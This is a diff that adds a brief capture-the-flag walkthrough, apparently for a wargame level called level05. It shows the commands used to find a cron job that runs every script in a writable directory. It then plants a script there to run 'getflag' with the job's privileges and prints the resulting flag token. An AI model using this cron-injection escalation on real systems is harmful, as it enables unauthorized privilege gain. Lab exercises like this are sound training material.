@@ -1,0 +1,15 @@
+🔻 Analyze
+⬇️ cd /
+⬇️ find . -user level05 2>/dev/null
+⬇️ cat /var/mail/level05
+👉 sh /usr/sbin/openarenaserver (cron)
+⬇️ cat /usr/sbin/openarenaserver
+
+
+🔻 Hack
+⬇️ echo "echo \$(getflag) > /opt/openarenaserver/.flag" > /opt/openarenaserver/to_do
+⬇️ ls -la /opt/openarenaserver/ ; date
+⬇️ wait 1 min
+⬇️ ls -la /opt/openarenaserver/ ; date
+⬇️ cat /opt/openarenaserver/.flag
+👉 Check flag.Here is your token : viuaaale9huek52boumoomioc
